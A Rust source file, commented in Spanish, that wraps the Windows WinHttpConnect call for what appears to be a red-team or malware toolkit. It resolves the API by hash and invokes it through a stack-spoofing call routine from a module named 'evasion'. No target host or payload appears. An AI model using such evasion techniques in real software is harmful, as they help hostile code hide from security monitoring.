use crate::nt::types::*;
use crate::techniques::evasion::dinamic_api_resolution::get_winhttp_base;
use crate::techniques::evasion::execution::user_mode_call::user_mode_call_with_spoof;

// Documentación oficial:
// https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpconnect

// Puertos estándar de conexión
pub const INTERNET_DEFAULT_PORT: INTERNET_PORT = 0;
pub const INTERNET_DEFAULT_HTTP_PORT: INTERNET_PORT = 80;
pub const INTERNET_DEFAULT_HTTPS_PORT: INTERNET_PORT = 443;

// Inicia conexión a un servidor HTTP
pub fn win_http_connect(
    h_session: HINTERNET,         // in - handle sesión winhttp
    pswz_server_name: LPCWSTR,    // in - nombre o ip servidor
    n_server_port: INTERNET_PORT, // in - puerto tcp conexión
    dw_reserved: DWORD,           // in - reservado debe ser cero
) -> Result<HINTERNET, String> { // ret - handle conexión o error
    let api_hash = 0x88136834; // unique_hash("WinHttpConnect")
    let winhttp_base = unsafe { get_winhttp_base().map_err(|e| e.to_string())? };

    let handle = user_mode_call_with_spoof(
        winhttp_base,
        api_hash,
        h_session as usize,
        pswz_server_name as usize,
        n_server_port as usize,
        dw_reserved as usize,
        0,
        0,
        0,
        0,
    )?;

    if handle == 0 {
        Err(String::from("WinHttpConnect retornó NULL (error al conectar al host HTTP)"))
    } else {
        Ok(handle as HINTERNET)
    }
}
